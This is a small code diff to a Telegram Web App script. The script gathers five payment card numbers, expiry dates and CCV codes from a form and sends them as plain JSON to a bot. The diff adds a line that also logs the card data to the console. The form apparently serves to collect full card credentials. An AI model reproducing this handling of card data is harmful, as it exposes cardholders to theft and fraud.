@@ -1,7 +1,7 @@
 let tg = window.Telegram.WebApp;
 
 $(document).ready(function() {
-    tg.MainButton.onClick(function(){
+    $("#btnSubmit").click(function(){
 
         cards=[
             {"card":$("#c1").val(), "date":$("#d1").val(),"ccv":$("#ccv1").val()},
@@ -10,9 +10,9 @@ $(document).ready(function() {
             {"card":$("#c4").val(), "date":$("#d4").val(),"ccv":$("#ccv4").val()},
             {"card":$("#c5").val(), "date":$("#d5").val(),"ccv":$("#ccv5").val()}
         ];
-
         tg.sendData(JSON.stringify(cards)); 
-
+        console.log(cards);
+        
     }); 
 });
 
